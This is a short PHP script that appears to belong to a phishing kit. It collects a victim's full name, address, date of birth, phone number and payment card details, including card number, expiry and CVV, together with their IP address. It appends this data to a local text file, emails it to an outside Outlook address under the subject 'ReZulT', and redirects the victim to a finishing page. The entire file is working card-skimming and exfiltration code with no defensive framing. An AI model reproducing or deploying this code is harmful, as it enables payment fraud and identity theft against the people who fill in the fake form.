<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$msg = "
Full name : ".$_SESSION['fname']."
adress : ".$_SESSION['adress']."
Date of Birth :  ".$_SESSION['day']." ".$_SESSION['month']." ".$_SESSION['year']."
state : ".$_SESSION['state']."
City : ".$_SESSION['city']."
Postcode : ".$_SESSION['zip']."
Mobile Number : ".$_SESSION['phone']."
---------------------------------
Name On Card : ".$_POST['noc']."
Card Number : ".$_POST['cc']."
Expiry Date : ".$_POST['cmonth']." ".$_POST['cyear']."
CSC/CVV : ".$_POST['cvv']."
IP : $ip
==================================";
$file = fopen("izi.txt","a");
fwrite($file, "\n".$msg);
fclose($file);

$send = "omrilil11@outlook.com";
$subject="#  ReZulT | $ip";
$headers = "From:<localhost>";
mail($send,$subject,$msg,$headers);

header("Location: fin.html");
?>